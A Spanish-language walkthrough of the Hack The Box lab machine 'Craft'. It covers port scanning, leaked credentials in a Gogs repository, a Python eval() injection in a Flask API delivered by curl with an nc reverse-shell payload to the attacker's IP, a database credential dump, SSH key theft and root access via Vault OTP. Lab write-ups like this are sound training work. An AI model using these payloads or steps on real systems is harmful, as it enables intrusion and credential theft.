# Resolución maquina Craft

**Autor:** PepeMaquina  
**Fecha:** 05 de Marzo de 2026
**Dificultad:** Medio  
**Sistema Operativo:** Linux  
**Tags:** Api, Source Code, ssh.

---
## Imagen de la Máquina

![](craft.jpg)

*Imagen: Craft.JPG*
## Reconocimiento Inicial
### Escaneo de Puertos
Comenzamos con un escaneo completo de nmap para identificar servicios expuestos:
~~~ bash
sudo nmap -p- --open -sS -vvv --min-rate 5000 -n -Pn 10.129.229.45 -oG networked
~~~
Luego queda realizar un escaneo detallado de puertos abiertos, en este punto de ven 3 puertos abiertos:
~~~ bash
sudo nmap -sCV -p22,443,6022 10.129.229.45 -oN targeted
~~~
### Enumeración de Servicios
~~~ 
PORT     STATE    SERVICE  VERSION
22/tcp   open     ssh      OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey: 
|   2048 bd:e7:6c:22:81:7a:db:3e:c0:f0:73:1d:f3:af:77:65 (RSA)
|   256 82:b5:f9:d1:95:3b:6d:80:0f:35:91:86:2d:b3:d7:66 (ECDSA)
|_  256 28:3b:26:18:ec:df:b3:36:85:9c:27:54:8d:8c:e1:33 (ED25519)
443/tcp  open     ssl/http nginx 1.15.8
| tls-nextprotoneg: 
|_  http/1.1
|_http-title: 400 The plain HTTP request was sent to HTTPS port
| tls-alpn: 
|_  http/1.1
| ssl-cert: Subject: commonName=craft.htb/organizationName=Craft/stateOrProvinceName=NY/countryName=US
| Not valid before: 2019-02-06T02:25:47
|_Not valid after:  2020-06-20T02:25:47
|_http-server-header: nginx/1.15.8
|_ssl-date: TLS randomness does not represent time
6022/tcp filtered x11
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
~~~
Por alguna razon en la enumeracion detallada aparece el puerto 6022 cerrado, al comprobarlo con rustscan tampoco aparece el puerto.
~~~bash
rustscan -a 10.129.229.45 --ulimit 5000 -- -A -sS -Pn -oN rustscan_initial.txt
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
I scanned ports so fast, even my computer was surprised.

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 10.129.229.45:22
Open 10.129.229.45:443
~~~
### Enumeración de la página web
Al ver el contenido de la pagina web se puede ver que tiene un apartado que redirige a un subdominio, tambien puedo saber que el dominio de mi ip es `craft.htb`.

![](craft2.jpg)

![](craft3.jpg)

~~~bash
┌──(kali㉿kali)-[~/htb/craft]
└─$ cat /etc/hosts | grep '10.129.229.45'
10.129.229.45 craft.htb gogs.craft.htb api.craft.htb
~~~
Realmente no es necesario hacer la enumeración de dominios con los datos que ya tenemos.

### Credenciales en repositorios
Al revisar las diversas paginas, primero veo el dominio `gogs` que es un repositorio de codigo como github.
Al revisar repositorios se ve que existe el proyecto de api.

![](craft4.jpg)

Al revisar el proyecto se ve que la pagina esta hecha en flask y que tiene una api corriendo por detras. Tambien se puede ver los endpoints y como esta construida, pero lo importante es que se pudo encontrar credenciales para un usuario llamado dineh, esto revisando los comints.

![](craft7.jpg)

![](craft8.jpg)

Revisando como funciona el codigo fuente puedo ver que en una parte del codigo del endpoint de para crear un `brew` usa una funcion incorrecta que es `eval`, en entornos de python de puede usar esto para generar comandos y realizar un RCE. La direccion que se vio es `/craft_api/api/brew/endpints/brew.py`

![](craft10.jpg)

### Aprovechando funcion peligrosa eval.
Por el momento se deja esto de lado y de procede a enumerar el subdominio de `api`.
Se puede ver que es usa swagger para ver endpoints.

![](craft9.jpg)

Entendiendo la logica detrar de la api, se tiene que loguearse para obtener un token de sesion (creado con JWT), al tener el token se puede crear, actualizar y borrar `brew` a voluntad.
Probando loguearse se utilizaron las credenciales encontradas anteriormente: `dinesh:4aUh0A8PbVJxgd` y esto entrega un token.

![](craft11.jpg)

![](craft12.jpg)

Pero lo malo es que no se sabe que cabecera se utiliza para confirmar el toeken.
Pero revisando los `ISSUES` del repositorio, se encontro un comando con curl que hizo un desarrollador donde utiliza la cabecera a usar con el token.

![](craft13.jpg)

Con todo lo necesario para crear un nuevo `brew`, primero se comprueba la autenticidad del token.
~~~bash
┌──(kali㉿kali)-[~/htb/craft/nmap]
└─$ curl -H 'X-Craft-API-Token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiZGluZXNoIiwiZXhwIjoxNzcyNzQ0NTg3fQ.PSPQjOV5JneE74PHBM96c5toetl7F01-axD2YHvTfhk' -H "Content-Type: application/json" -k -X GET https://api.craft.htb/api/auth/check
{"message":"Token is valid!"}
~~~
Ahora creando el comando para generar codigo malicioso en python, se emplea una estructura un poco complicada de ver visualmente pero funciona correctamente.
Es peligroso colocar la funcion `eval` en todos los lenguajes y aun mas en python porque se puede interpretar codigo en python, sabiendo que desde python se puede generar codigo en el sistema esto se hace aun mas peligroso.
~~~json
{  
"abv": "__import__('os').system('id')"  
}
~~~
Esta es la estructura que puede ser peligrosa, asi que generando la creacion maliciosa de un `brew`.
~~~bash
┌──(kali㉿kali)-[~/htb/craft/nmap]
└─$ curl -H 'X-Craft-API-Token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiZGluZXNoIiwiZXhwIjoxNzcyNzQ1MjkxfQ.1M6naSZM6T3hTZXUv0BzvJAW_S0e3iO5c2F39PmbFrM' -H "Content-Type: application/json" -k -X POST https://api.craft.htb/api/brew/ -d "{\"name\":\"bullshit\",\"brewer\":\"bullshit\",\"style\":\"bullshit\",\"abv\":\"__import__('os').system('nc 10.10.14.128 4433 -e sh')\"}"       

~~~
Se realizo varias pruebas, pero parece que el sistema solo admite `sh` y no `bash`.
Desde otra terminal se abre `penelope` para interceptar la reverse shell.
~~~bash
┌──(kali㉿kali)-[~/htb/craft/nmap]
└─$ penelope -p 4433  
[+] Listening for reverse shells on 0.0.0.0:4433 →  127.0.0.1 • 192.168.5.128 • 172.18.0.1 • 172.17.0.1 • 10.10.14.128
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] Got reverse shell from 5a3d243127f5~10.129.229.45-Linux-x86_64 😍 Assigned SessionID <1>
[+] Attempting to upgrade shell to PTY...
[+] Shell upgraded successfully using /usr/local/bin/python3! 💪
[+] Interacting with session [1], Shell Type: PTY, Menu key: F12 
[+] Logging to /home/kali/.penelope/sessions/5a3d243127f5~10.129.229.45-Linux-x86_64/2026_03_05-16_11_42-865.log 📜
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
/opt/app #
~~~
Ya se tiene control sobre el servidor, pero por mala suerte este un contenedor en docker con permisos root.

### Conexion a DB en otro contenedor
Tras realizar enumeracion manual se pudo ver que no contiene mysql dentro, pero la pagina web y el codigo si mencionaba el uso una base de datos para autenticar usuarios y generar un token.
Revisando las tablas arp.
~~~bash
/ # arp
craft_db_1.craft_default (172.20.0.4) at 02:42:ac:14:00:04 [ether]  on eth0
? (172.20.0.1) at 02:42:6c:ec:a6:6e [ether]  on eth0
craft_vault_1.craft_default (172.20.0.2) at 02:42:ac:14:00:02 [ether]  on eth0
craft_proxy_1.craft_default (172.20.0.7) at 02:42:ac:14:00:07 [ether]  on eth0
~~~
Se ve que existe otro contenedor con nombre `craft_db_1.craft_default`, esto quiere decir que lo mas probable es que se hayan creado varios contenedores en un archivo `.yaml`, donde uno es flask y otro contiene ma db.
Tambien se logro encontrar las credenciales de la base de datos.
~~~bash
/opt/app/craft_api # cat /opt/app/craft_api/settings.py 
# Flask settings
FLASK_SERVER_NAME = 'api.craft.htb'
FLASK_DEBUG = False  # Do not use debug mode in production

# Flask-Restplus settings
RESTPLUS_SWAGGER_UI_DOC_EXPANSION = 'list'
RESTPLUS_VALIDATE = True
RESTPLUS_MASK_SWAGGER = False
RESTPLUS_ERROR_404_HELP = False
CRAFT_API_SECRET = 'hz66OCkDtv8G6D'

# database
MYSQL_DATABASE_USER = 'craft'
MYSQL_DATABASE_PASSWORD = 'qLGockJ6G2J75O'
MYSQL_DATABASE_DB = 'craft'
MYSQL_DATABASE_HOST = 'db'
SQLALCHEMY_TRACK_MODIFICATIONS = False
~~~
Con esta informacion y con python se puede generar un pequeño script para conectarse la DB y obtener las cerdenciales de los usuarios.
~~~python
import pymysql  
  
conn = pymysql.connect(  
host="db",  
user="craft",  
password="qLGockJ6G2J75O",  
db="craft"  
)  
  
cursor = conn.cursor()  
cursor.execute("show tables;")  
print(cursor.fetchall())
~~~
Me dio flojera crear un script asi que se utilizo comandos manualmente:
~~~bash
/tmp # python3 
Python 3.6.8 (default, Feb  6 2019, 01:56:13) 
[GCC 8.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import pymysql
>>> conn = pymysql.connect(
...     host="db",
...     user="craft",
...     password="qLGockJ6G2J75O",
...     db="craft"
... )
>>> cursor = conn.cursor()
>>> cursor.execute("show tables;")
2
>>> print(cursor.fetchall())
(('brew',), ('user',))
>>> cursor.execute("select * from user;")
3
>>> print(cursor.fetchall())
((1, 'dinesh', '4aUh0A8PbVJxgd'), (4, 'ebachman', 'llJ77D8QFkLPQB'), (5, 'gilfoyle', 'ZEU3N8WNM2rh4T'))
>>> exit()
~~~
De esa forma de obtuvieron credenciales.
Probando esto para conectarse por SSH no funcionó, pero son credenciales validad para iniciar secion el `gogs` que se encontro al principio, lo masprobable es que existan repositorios propios para cada usuario.
Intentando obtener repositorios privados se puede ver que el usuario `gilfoyle:ZEU3N8WNM2rh4T` si tiene un repositorio privado.

![](craft14.jpg)

Al ver el contenido se tiene un `id_rsa` por la cual es puede ingresar a la maquina real del servidor.

![](craft15.jpg)

~~~bash
┌──(kali㉿kali)-[~/htb/craft]
└─$ ssh -i id_rsa gilfoyle@10.129.229.45 


  .   *   ..  . *  *
*  * @()Ooc()*   o  .
    (Q@*0CG*O()  ___
   |\_________/|/ _ \
   |  |  |  |  | / | |
   |  |  |  |  | | | |
   |  |  |  |  | | | |
   |  |  |  |  | | | |
   |  |  |  |  | | | |
   |  |  |  |  | \_| |
   |  |  |  |  |\___/
   |\_|__|__|_/|
    \_________/



Enter passphrase for key 'id_rsa':
~~~
El `id_rsa` tambien solicita una passphrase, asi que se intenta con la misma contraseña que `gogs` `ZEU3N8WNM2rh4T` y funciona, confirmando un password reuse.
~~~bash
Enter passphrase for key 'id_rsa': 
Linux craft.htb 6.1.0-12-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.52-1 (2023-09-07) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Thu Nov 16 08:03:39 2023 from 10.10.14.23
gilfoyle@craft:~$ 
~~~

---
## User Flag

> **Valor de la Flag:** `<Averiguelo usted mismo>`

### User Flag
Con acceso al servidor, ahora se puede buscar la user flag.
~~~bash
gilfoyle@craft:~$ ls
user.txt
gilfoyle@craft:~$ cat user.txt 
<Encuentre su propia user flag>
~~~

---
## Escalada de Privilegios
Para la escalada de privilegios se enumero el servidor manualmente sin un punto claro por donde escalar.
Pero volviendo a revisar el repositorio privado de `gilfoyle` se pudieron ver un archivo sospechosamente creado.

![](craft16.jpg)

Revisando que es `vault` en internet combinado con ssh, se logro encontrar un post donde menciona que es una forma mas segura de ingresas por ssh. (https://codemancers.com/blog/2020-05-04-ssh-access-management-part-2)
Revisando el script `secret.sh` se ve que crea un nuevo rol `root_otp` enlazado con el usuario `root` que entregaria una escalada facil.
Otro punto es que lo configura con llave `otp`, esto quiere decir que la contraseña cambia con cada inicio de sesion.
Siguiendo el post, esto entrega una forma elegante de conectarse.
~~~bash
gilfoyle@craft:~$ vault write ssh/creds/root_otp ip=127.0.0.1
Key                Value
---                -----
lease_id           ssh/creds/root_otp/1d80df3e-7efd-28aa-7a01-2bfd77b12ccc
lease_duration     768h
lease_renewable    false
ip                 127.0.0.1
key                911bf4cf-5744-865c-e348-e9831ce74966
key_type           otp
port               22
username           root
~~~
Con ese comando se puede ver el usuario vinculado al rol que efectivamente el `root`, tambien se ve la KEY opt con la cual se puede entrar.
~~~bash
gilfoyle@craft:~$ ssh root@127.0.0.1


  .   *   ..  . *  *
*  * @()Ooc()*   o  .
    (Q@*0CG*O()  ___
   |\_________/|/ _ \
   |  |  |  |  | / | |
   |  |  |  |  | | | |
   |  |  |  |  | | | |
   |  |  |  |  | | | |
   |  |  |  |  | | | |
   |  |  |  |  | \_| |
   |  |  |  |  |\___/
   |\_|__|__|_/|
    \_________/



Password: 
Linux craft.htb 6.1.0-12-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.52-1 (2023-09-07) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Thu Mar  5 18:05:38 2026 from 127.0.0.1
root@craft:~#
~~~
Agregando la key opt se puede iniciar sesion como root.

ALTERNATIVA
Revisando las preguntas guia de HTB, se puede ver que existe un comando mas simple para conectarse por ssh.
~~~bash
gilfoyle@craft:~$ vault ssh -mode=otp -role=root_otp root@127.0.0.1
Vault could not locate "sshpass". The OTP code for the session is displayed
below. Enter this code in the SSH password prompt. If you install sshpass,                                                                                  
Vault can automatically perform this step for you.                                                                                                          
OTP for the session is: 6873406f-8b05-5fa4-ef6e-51ca6eadae16


  .   *   ..  . *  *
*  * @()Ooc()*   o  .
    (Q@*0CG*O()  ___
   |\_________/|/ _ \
   |  |  |  |  | / | |
   |  |  |  |  | | | |
   |  |  |  |  | | | |
   |  |  |  |  | | | |
   |  |  |  |  | | | |
   |  |  |  |  | \_| |
   |  |  |  |  |\___/
   |\_|__|__|_/|
    \_________/



Password:
~~~
De igual forma, agregando el opt se puede entrar como root:
~~~bash
Linux craft.htb 6.1.0-12-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.52-1 (2023-09-07) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Thu Nov 16 07:14:50 2023
root@craft:~#
~~~

---
## Root Flag

> **Valor de la Flag:** `<Averiguelo usted mismo>`

Con acceso como root a la maquina, ya se puede leer la root flag sin problema.
~~~
root@craft:~# cat /root/root.txt
<Encuentre su propia root flag>
~~~
🎉 Sistema completamente comprometido - Root obtenido

